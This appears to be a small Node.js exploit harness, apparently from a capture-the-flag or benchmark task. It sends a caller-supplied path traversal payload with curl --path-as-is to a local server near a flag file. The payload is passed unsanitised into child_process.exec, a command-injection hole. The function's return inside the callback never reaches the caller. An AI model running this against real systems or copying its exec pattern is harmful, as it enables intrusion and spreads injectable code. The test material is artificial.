function exploitFunction(payload) {
  const path = require("path");
  const { sleep } = require("sleep");
  const pathToFlag = path.resolve(__dirname, "../flag.html");

  // Simulate starting the server
  console.log("Starting the server...");
  sleep.sleep(2);

  // Craft the attack string with the payload
  const attack_string = `curl -v --path-as-is "http://127.0.0.1:55555${payload}"`;

  // Execute the attack string
  const { exec } = require("child_process");
  exec(attack_string, (error, stdout) => {
    if (error) {
      console.error(`Error: ${error}`);
      return;
    }
    return stdout; // Return the output for verification
  });
}

module.exports = { exploitFunction };